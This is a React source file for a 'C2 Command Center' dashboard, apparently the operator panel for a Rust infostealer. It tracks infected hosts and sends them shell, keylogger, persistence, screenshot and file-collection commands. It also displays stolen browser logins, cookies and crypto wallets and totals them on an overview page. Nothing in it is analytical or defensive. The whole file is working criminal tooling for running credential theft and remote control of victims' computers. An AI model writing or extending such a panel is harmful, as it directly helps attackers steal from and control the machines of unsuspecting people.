import React, { useState, useEffect, useMemo } from 'react';
import { motion } from 'framer-motion';
import { useAdminAuth } from '../contexts/AdminAuthContext';
import C2Debug from './C2Debug';
import { BarChart, Bar, XAxis, YAxis, CartesianGrid, Tooltip, Legend, ResponsiveContainer, PieChart, Pie, Cell } from 'recharts';

// Matches the LogPayload from the Rust stealer
interface Log {
  id: number; // Assuming the backend will add an ID
  agent_id: string;
  hostname: string;
  username: string;
  log_type: string;
  data: any; // This will be parsed based on log_type
  created_at: string;
}

interface Agent {
  id: number;
  agent_id: string;
  hostname: string;
  username: string;
  os_info: string;
  ip_address: string;
  last_seen: string;
  status: 'active' | 'inactive' | 'compromised';
  created_at: string;
}

interface Command {
  id: number;
  agent_id: string;
  command_type: 'shell' | 'download' | 'upload' | 'screenshot' | 'keylog' | 'persistence' | 'collect_data' | 'collect_files' | 'kill_agent' | 'kill_process';
  command_data: string;
  status: 'pending' | 'executing' | 'completed' | 'failed';
  result: string;
  created_at: string;
  executed_at: string;
  completed_at: string;
}

const C2Dashboard: React.FC = () => {
  const [agents, setAgents] = useState<Agent[]>([]);
  const [logs, setLogs] = useState<Log[]>([]);
  const [selectedAgent, setSelectedAgent] = useState<string>('');
  const [commandType, setCommandType] = useState<'shell' | 'download' | 'upload' | 'screenshot' | 'keylog' | 'persistence' | 'collect_data' | 'collect_files' | 'kill_agent' | 'kill_process'>('shell');
  const [commandData, setCommandData] = useState('');
  const [isLoading, setIsLoading] = useState(true);
  const [activeTab, setActiveTab] = useState<'overview' | 'agents' | 'commands' | 'logs' | 'debug'>('overview');
  const [selectedLog, setSelectedLog] = useState<Log | null>(null);
  const [showInactive, setShowInactive] = useState(false);
  const { isAdminAuthenticated } = useAdminAuth();

  useEffect(() => {
    if (isAdminAuthenticated) {
      fetchData();
      const interval = setInterval(fetchData, 5000); // Refresh every 5 seconds
      return () => clearInterval(interval);
    }
  }, [isAdminAuthenticated]);

  const getAuthHeaders = (): HeadersInit => {
    const token = localStorage.getItem('admin_token');
    const headers = new Headers();
    if (token) {
      headers.append('Authorization', `Bearer ${token}`);
    }
    return headers;
  };

  const getAuthHeadersWithContentType = (): HeadersInit => {
    const headers = getAuthHeaders();
    (headers as Headers).append('Content-Type', 'application/json');
    return headers;
  };

  const fetchData = async () => {
    if (!isAdminAuthenticated) return;

    try {
      const headers = getAuthHeaders();
      const [agentsRes, logsRes] = await Promise.all([
        fetch('/api/admin/c2/agents', { headers }),
        fetch('/api/admin/c2/logs', { headers }) // Fetch logs instead of results
      ]);
      
      if (agentsRes.ok) {
        const agentsData = await agentsRes.json();
        setAgents(agentsData);
      } else {
        console.error('Agents endpoint failed:', agentsRes.status, agentsRes.statusText);
      }
      
      if (logsRes.ok) {
        const logsData = await logsRes.json();
        setLogs(logsData);
      } else {
        console.error('Logs endpoint failed:', logsRes.status, logsRes.statusText);
      }
    } catch (error) {
      console.error('Error fetching C2 data:', error);
    } finally {
      setIsLoading(false);
    }
  };

  const sendCommand = async () => {
    if (!selectedAgent || !commandData.trim()) {
      alert('Please select an agent and enter a command');
      return;
    }

    try {
      const response = await fetch('/api/admin/c2/command', {
        method: 'POST',
        headers: getAuthHeadersWithContentType(),
        body: JSON.stringify({
          agent_id: selectedAgent,
          command_type: commandType,
          command_data: commandData
        })
      });

      if (response.ok) {
        setCommandData('');
        alert('Command sent successfully');
        fetchData();
      } else {
        alert('Failed to send command');
      }
    } catch (error) {
      console.error('Error sending command:', error);
      alert('Error sending command');
    }
  };

  const downloadFile = async (agentId: string, filename: string) => {
    try {
      console.log('Attempting to download:', { agentId, filename });
      const response = await fetch(`/api/admin/c2/download/${encodeURIComponent(agentId)}/${encodeURIComponent(filename)}`, {
        headers: getAuthHeaders()
      });

      console.log('Download response:', {
        status: response.status,
        statusText: response.statusText,
        headers: Object.fromEntries(response.headers.entries())
      });

      if (response.ok) {
        const blob = await response.blob();
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        window.URL.revokeObjectURL(url);
        document.body.removeChild(a);
      } else {
        let errorMessage = `Failed to download file: Server returned status ${response.status}`;
        try {
          const errorData = await response.json();
          errorMessage = `Failed to download file: ${errorData.error || response.statusText}`;
          console.error('Download error details:', errorData);
        } catch (parseError) {
          console.error('Could not parse error response:', parseError);
        }
        alert(errorMessage);
      }
    } catch (error) {
      console.error('Error downloading file:', error);
      alert('Error downloading file: ' + (error instanceof Error ? error.message : 'Unknown error'));
    }
  };

  const killAgent = async (agentId: string, killType: 'agent' | 'process') => {
    if (!confirm(`Are you sure you want to kill this ${killType}? This action cannot be undone.`)) {
      return;
    }

    try {
      const response = await fetch(`/api/admin/c2/kill/${encodeURIComponent(agentId)}`, {
        method: 'POST',
        headers: getAuthHeadersWithContentType(),
        body: JSON.stringify({ killType })
      });

      if (response.ok) {
        const result = await response.json();
        alert(`Kill command sent successfully: ${result.message}`);
        fetchData(); // Refresh data
      } else {
        try {
          const errorData = await response.json();
          alert(`Failed to send kill command: ${errorData.error || response.statusText}`);
        } catch {
          alert(`Failed to send kill command: Server returned status ${response.status}`);
        }
      }
    } catch (error) {
      console.error('Error killing agent:', error);
      alert('Error killing agent');
    }
  };

  const deleteAgent = async (agentId: string) => {
    if (!confirm(`Are you sure you want to permanently delete this agent? This action cannot be undone and will remove all associated data.`)) {
      return;
    }

    try {
      const response = await fetch(`/api/admin/c2/agents/${encodeURIComponent(agentId)}`, {
        method: 'DELETE',
        headers: getAuthHeaders()
      });

      if (response.ok) {
        const result = await response.json();
        alert(`Agent deleted successfully: ${result.message}`);
        fetchData(); // Refresh data
      } else {
        try {
          const errorData = await response.json();
          alert(`Failed to delete agent: ${errorData.error || response.statusText}`);
        } catch {
          alert(`Failed to delete agent: Server returned status ${response.status}`);
        }
      }
    } catch (error) {
      console.error('Error deleting agent:', error);
      alert('Error deleting agent');
    }
  };

  const deleteLog = async (logId: number) => {
    if (!confirm('Are you sure you want to delete this log? This action cannot be undone.')) {
      return;
    }

    try {
      const response = await fetch(`/api/admin/c2/logs/${logId}`, {
        method: 'DELETE',
        headers: getAuthHeaders()
      });

      if (response.ok) {
        setLogs(logs.filter(l => l.id !== logId));
        alert('Log deleted successfully');
      } else {
        const data = await response.json();
        alert(`Failed to delete log: ${data.error || 'Unknown error'}`);
      }
    } catch (error) {
      console.error('Error deleting log:', error);
      alert('Error deleting log');
    }
  };

  const getStatusColor = (status: string) => {
    switch (status) {
      case 'active': return 'text-green-500';
      case 'inactive': return 'text-yellow-500';
      case 'compromised': return 'text-red-500';
      default: return 'text-gray-500';
    }
  };

  const getStatusDotColor = (status: string) => {
    switch (status) {
      case 'active': return 'bg-green-500';
      case 'inactive': return 'bg-yellow-500';
      case 'compromised': return 'bg-red-500';
      default: return 'bg-gray-500';
    }
  };

  const getCommandTypeColor = (type: string) => {
    switch (type) {
      case 'shell': return 'bg-blue-500';
      case 'download': return 'bg-green-500';
      case 'upload': return 'bg-purple-500';
      case 'screenshot': return 'bg-yellow-500';
      case 'keylog': return 'bg-red-500';
      case 'persistence': return 'bg-indigo-500';
      case 'collect_data': return 'bg-teal-500';
      case 'collect_files': return 'bg-orange-500';
      case 'kill_process': return 'bg-red-600';
      case 'kill_agent': return 'bg-red-800';
      default: return 'bg-gray-500';
    }
  };

  const getLogTypeColor = (type: string) => {
    switch (type) {
      case 'system_info': return 'bg-blue-500';
      case 'browsers': return 'bg-yellow-500';
      case 'wallets': return 'bg-green-500';
      case 'steam': return 'bg-gray-600';
      case 'processes': return 'bg-purple-500';
      case 'network': return 'bg-teal-500';
      default: return 'bg-gray-500';
    }
  };

  const filteredAgents = showInactive ? agents : agents.filter(a => a.status === 'active');

  // Don't render if not authenticated
  if (!isAdminAuthenticated) {
    return null;
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-csfloat-darker to-black pt-16 pb-12 text-white">
      <div className="max-w-screen-2xl mx-auto px-4 sm:px-6 lg:px-8">
        <div className="mb-8">
          <h1 className="text-4xl font-bold text-white mb-2">C2 Command Center</h1>
          <p className="text-csfloat-light/70">An overview of agent activity and collected intelligence.</p>
        </div>

        {/* Tabs */}
        <div className="flex space-x-1 mb-6">
          {[
            { id: 'overview', label: 'Overview' },
            { id: 'agents', label: 'Agents' },
            { id: 'commands', label: 'Commands' },
            { id: 'logs', label: 'Logs' },
            { id: 'debug', label: 'Debug' }
          ].map((tab) => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id as any)}
              className={`px-6 py-3 rounded-lg font-medium transition-colors ${
                activeTab === tab.id
                  ? 'bg-csfloat-blue text-white'
                  : 'text-csfloat-light/70 hover:text-white hover:bg-csfloat-gray/20'
              }`}
            >
              {tab.label}
            </button>
          ))}
        </div>
        
        {isLoading ? (
          <div className="text-center py-8">
            <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-csfloat-blue mx-auto"></div>
            <p className="mt-4 text-csfloat-light/60">Loading C2 data...</p>
          </div>
        ) : (
          <>
            {/* Overview Tab */}
            {activeTab === 'overview' && <OverviewTab agents={agents} logs={logs} />}

            {/* Agents Tab - simplified, as full details are in logs */}
            {activeTab === 'agents' && (
              <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg border border-csfloat-gray/20">
                <div className="p-6">
                  <div className="flex justify-between items-center mb-4">
                    <h2 className="text-2xl font-bold">Agents ({filteredAgents.length})</h2>
                    <label className="flex items-center space-x-2 cursor-pointer">
                      <input 
                        type="checkbox" 
                        className="form-checkbox h-5 w-5 text-blue-600 bg-gray-800 border-gray-600 rounded focus:ring-blue-500"
                        checked={showInactive}
                        onChange={() => setShowInactive(!showInactive)}
                      />
                      <span className="text-gray-300">Show Inactive</span>
                    </label>
                  </div>
                  <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                    {filteredAgents.map(agent => (
                      <div 
                        key={agent.agent_id} 
                        className={`bg-gray-800 rounded-lg p-4 cursor-pointer transition-all duration-200 ${selectedAgent === agent.agent_id ? 'ring-2 ring-blue-500' : 'hover:bg-gray-700'}`}
                        onClick={() => setSelectedAgent(agent.agent_id)}
                      >
                        <div className="flex justify-between items-start">
                          <div className="flex-grow">
                            <div className="flex items-center mb-2">
                              <div className={`w-3 h-3 rounded-full mr-2 ${getStatusDotColor(agent.status)}`}></div>
                              <p className="font-bold text-lg truncate" title={agent.hostname}>{agent.hostname}</p>
                            </div>
                            <p className="text-sm text-gray-400 truncate" title={agent.agent_id}>{agent.agent_id}</p>
                          </div>
                          <div className="flex-shrink-0">
                             <span className={`px-2 py-1 text-xs font-semibold rounded-full ${getStatusColor(agent.status)} bg-opacity-20`}>
                              {agent.status}
                            </span>
                          </div>
                        </div>
                        <div className="mt-4 space-y-2 text-sm">
                          <div className="flex justify-between">
                            <span className="text-gray-400">Username:</span>
                            <span className="font-mono">{agent.username}</span>
                          </div>
                          <div className="flex justify-between">
                            <span className="text-gray-400">IP Address:</span>
                            <span className="font-mono">{agent.ip_address}</span>
                          </div>
                          <div className="flex justify-between">
                            <span className="text-gray-400">OS:</span>
                            <span className="text-right truncate" title={agent.os_info}>{agent.os_info}</span>
                          </div>
                          <div className="flex justify-between">
                            <span className="text-gray-400">Last Seen:</span>
                            <span>{new Date(agent.last_seen).toLocaleString()}</span>
                          </div>
                        </div>
                        {/* Kill Agent Buttons */}
                        <div className="mt-4 pt-3 border-t border-gray-700">
                          <div className="flex space-x-2 mb-2">
                            <button
                              onClick={(e) => {
                                e.stopPropagation();
                                killAgent(agent.agent_id, 'process');
                              }}
                              className="flex-1 bg-red-600 hover:bg-red-700 text-white px-3 py-1 rounded text-xs font-medium transition-colors"
                              title="Kill the agent process (agent will restart if persistence is enabled)"
                            >
                              Kill Process
                            </button>
                            <button
                              onClick={(e) => {
                                e.stopPropagation();
                                killAgent(agent.agent_id, 'agent');
                              }}
                              className="flex-1 bg-red-800 hover:bg-red-900 text-white px-3 py-1 rounded text-xs font-medium transition-colors"
                              title="Terminate the agent completely (marks as compromised)"
                            >
                              Kill Agent
                            </button>
                          </div>
                          <div className="flex">
                            <button
                              onClick={(e) => {
                                e.stopPropagation();
                                deleteAgent(agent.agent_id);
                              }}
                              className="w-full bg-gray-800 hover:bg-gray-700 text-red-400 hover:text-red-300 px-3 py-1 rounded text-xs font-medium transition-colors border border-gray-600 hover:border-gray-500"
                              title="Permanently delete this agent and all associated data"
                            >
                              🗑️ Delete Agent
                            </button>
                          </div>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            )}

            {/* Commands Tab - simplified */}
            {activeTab === 'commands' && (
              <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg border border-csfloat-gray/20">
                <div className="p-6">
                  <h2 className="text-2xl font-bold text-white mb-4">Send Command</h2>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
                    <div>
                      <label className="block text-sm font-medium text-csfloat-light/70 mb-2">
                        Select Agent
                      </label>
                      <select
                        value={selectedAgent}
                        onChange={(e) => setSelectedAgent(e.target.value)}
                        className="w-full bg-csfloat-darker border border-csfloat-gray/20 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-csfloat-blue"
                      >
                        <option value="">Choose an agent...</option>
                        {agents.map((agent) => (
                          <option key={agent.id} value={agent.agent_id}>
                            {agent.hostname} ({agent.agent_id})
                          </option>
                        ))}
                      </select>
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-csfloat-light/70 mb-2">
                        Command Type
                      </label>
                      <select
                        value={commandType}
                        onChange={(e) => setCommandType(e.target.value as any)}
                        className="w-full bg-csfloat-darker border border-csfloat-gray/20 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-csfloat-blue"
                      >
                        <option value="shell">Shell Command</option>
                        <option value="download">Download File</option>
                        <option value="upload">Upload File</option>
                        <option value="screenshot">Screenshot</option>
                        <option value="keylog">Keylogger</option>
                        <option value="persistence">Persistence</option>
                        <option value="collect_data">Collect Data</option>
                        <option value="collect_files">Collect Files</option>
                        <option value="kill_process">Kill Process</option>
                        <option value="kill_agent">Kill Agent</option>
                      </select>
                    </div>
                  </div>
                  <div className="mb-6">
                    <label className="block text-sm font-medium text-csfloat-light/70 mb-2">
                      Command Data
                    </label>
                    <textarea
                      value={commandData}
                      onChange={(e) => setCommandData(e.target.value)}
                      placeholder="Enter command or file path..."
                      className="w-full bg-csfloat-darker border border-csfloat-gray/20 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-csfloat-blue h-32 resize-none"
                    />
                  </div>
                  <button
                    onClick={sendCommand}
                    disabled={!selectedAgent || !commandData.trim()}
                    className="bg-csfloat-blue hover:bg-blue-600 disabled:bg-csfloat-gray/50 text-white px-6 py-2 rounded-lg transition-colors duration-200 disabled:cursor-not-allowed"
                  >
                    Send Command
                  </button>
                </div>
              </div>
            )}

            {/* Logs Tab */}
            {activeTab === 'logs' && <LogsTab logs={logs} onSelectLog={setSelectedLog} onDeleteLog={deleteLog} getLogTypeColor={getLogTypeColor} />}

            {/* Debug Tab */}
            {activeTab === 'debug' && <C2Debug />}
          </>
        )}

        {/* Log Viewer Modal */}
        {selectedLog && (
          <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50 backdrop-blur-sm">
            <motion.div 
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1.0 }}
              className="bg-csfloat-dark rounded-lg p-6 max-w-4xl w-full mx-4 max-h-[90vh] overflow-y-auto border border-csfloat-gray/20"
            >
              <div className="flex justify-between items-center mb-4">
                <h3 className="text-xl font-bold text-white">Log Details</h3>
                <button
                  onClick={() => setSelectedLog(null)}
                  className="text-csfloat-light/60 hover:text-white"
                >
                  ✕
                </button>
              </div>
              <LogViewer log={selectedLog} />
            </motion.div>
          </div>
        )}
      </div>
    </div>
  );
};

const OverviewTab: React.FC<{agents: Agent[], logs: Log[]}> = ({ agents, logs }) => {
  const stats = useMemo(() => {
    let passwords = 0;
    let cookies = 0;
    let wallets = 0;

    logs.forEach(log => {
      if (log.log_type === 'browsers') {
        Object.values(log.data.chromium || {}).forEach((browser: any) => {
          passwords += browser.logins?.length || 0;
          cookies += browser.cookies?.length || 0;
        });
        Object.values(log.data.gecko || {}).forEach((browser: any) => {
          passwords += browser.logins?.length || 0;
          cookies += browser.cookies?.length || 0;
        });
      }
      if (log.log_type === 'wallets') {
        Object.values(log.data).forEach((wallet_list: any) => {
            wallets += wallet_list.length || 0;
        });
      }
    });

    return { passwords, cookies, wallets };
  }, [logs]);

  const logTypeData = useMemo(() => {
      const counts = logs.reduce((acc, log) => {
          acc[log.log_type] = (acc[log.log_type] || 0) + 1;
          return acc;
      }, {} as Record<string, number>);
      return Object.entries(counts).map(([name, value]) => ({ name, value }));
  }, [logs]);

  const COLORS = ['#0088FE', '#00C49F', '#FFBB28', '#FF8042', '#AF19FF', '#FF1943'];


  return (
      <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
        {/* Stats Cards */}
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
           <StatCard title="Total Agents" value={agents.length} />
           <StatCard title="Active Agents" value={agents.filter(a => a.status === 'active').length} color="text-green-500" />
           <StatCard title="Total Logs" value={logs.length} color="text-blue-500" />
           <StatCard title="Total Wallets" value={stats.wallets} color="text-green-400" />
           <StatCard title="Passwords" value={stats.passwords} color="text-yellow-500" />
           <StatCard title="Cookies" value={stats.cookies} color="text-orange-500" />
        </div>

        {/* Charts */}
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
            <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg p-6 border border-csfloat-gray/20">
                <h3 className="text-xl font-bold mb-4">Logs by Type</h3>
                <ResponsiveContainer width="100%" height={300}>
                    <BarChart data={logTypeData}>
                        <CartesianGrid strokeDasharray="3 3" stroke="rgba(255, 255, 255, 0.1)" />
                        <XAxis dataKey="name" stroke="#8892b0" />
                        <YAxis stroke="#8892b0"/>
                        <Tooltip contentStyle={{ backgroundColor: '#1a202c', border: '1px solid #4a5568' }}/>
                        <Legend />
                        <Bar dataKey="value" fill="#8884d8" />
                    </BarChart>
                </ResponsiveContainer>
            </div>
            <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg p-6 border border-csfloat-gray/20">
                <h3 className="text-xl font-bold mb-4">Agents by OS</h3>
                {/* Placeholder for OS chart */}
                <p className="text-csfloat-light/70">OS distribution chart coming soon.</p>
            </div>
        </div>
      </motion.div>
  );
}

const StatCard: React.FC<{title: string, value: number | string, color?: string}> = ({ title, value, color = 'text-white' }) => (
    <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg p-6 border border-csfloat-gray/20">
        <h3 className="text-csfloat-light/70 text-sm mb-2">{title}</h3>
        <p className={`text-3xl font-bold ${color}`}>{value}</p>
    </div>
);


const LogsTab: React.FC<{logs: Log[], onSelectLog: (log: Log) => void, onDeleteLog: (id: number) => void, getLogTypeColor: (type: string) => string}> = ({ logs, onSelectLog, onDeleteLog, getLogTypeColor }) => {
    return (
        <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg border border-csfloat-gray/20 overflow-hidden">
            <table className="min-w-full divide-y divide-csfloat-gray/20">
                <thead className="bg-csfloat-dark">
                    <tr>
                        <th className="px-6 py-3 text-left text-xs font-medium text-csfloat-light/70 uppercase tracking-wider">Agent</th>
                        <th className="px-6 py-3 text-left text-xs font-medium text-csfloat-light/70 uppercase tracking-wider">Log Type</th>
                        <th className="px-6 py-3 text-left text-xs font-medium text-csfloat-light/70 uppercase tracking-wider">Time</th>
                        <th className="px-6 py-3 text-right text-xs font-medium text-csfloat-light/70 uppercase tracking-wider">Actions</th>
                    </tr>
                </thead>
                <tbody className="divide-y divide-csfloat-gray/20">
                    {logs.map(log => (
                        <tr key={log.id} className="hover:bg-csfloat-gray/10 transition-colors">
                            <td className="px-6 py-4 whitespace-nowrap">
                                <div className="text-sm font-medium">{log.hostname}</div>
                                <div className="text-xs text-csfloat-light/70 font-mono">{log.agent_id}</div>
                            </td>
                             <td className="px-6 py-4 whitespace-nowrap">
                                <span className={`inline-block px-2 py-0.5 rounded text-xs font-semibold ${getLogTypeColor(log.log_type)}`}>
                                    {log.log_type}
                                </span>
                            </td>
                            <td className="px-6 py-4 whitespace-nowrap text-sm text-csfloat-light/70">{new Date(log.created_at).toLocaleString()}</td>
                            <td className="px-6 py-4 whitespace-nowrap text-right text-sm font-medium">
                                <button onClick={() => onSelectLog(log)} className="text-csfloat-blue hover:text-blue-400 mr-4">View</button>
                                <button onClick={() => onDeleteLog(log.id)} className="text-red-500 hover:text-red-400">Delete</button>
                            </td>
                        </tr>
                    ))}
                </tbody>
            </table>
        </div>
    );
}

const LogViewer: React.FC<{log: Log}> = ({ log }) => {
    // A simple recursive renderer for JSON data
    const renderJson = (data: any) => {
        if (typeof data !== 'object' || data === null) {
            return <span className="text-green-400">{JSON.stringify(data)}</span>;
        }

        if (Array.isArray(data)) {
            return (
                <div className="pl-4 border-l border-gray-700">
                    {data.map((item, index) => <div key={index}>{renderJson(item)}</div>)}
                </div>
            );
        }

        return (
            <div className="pl-4 border-l border-gray-700">
                {Object.entries(data).map(([key, value]) => (
                    <div key={key}>
                        <span className="text-blue-400">{key}: </span>
                        {renderJson(value)}
                    </div>
                ))}
            </div>
        );
    }

    return (
        <div className="bg-csfloat-darker rounded p-4 border border-csfloat-gray/10">
            <pre className="text-white text-sm whitespace-pre-wrap">
                {JSON.stringify(log.data, null, 2)}
            </pre>
        </div>
    );
};


export default C2Dashboard; 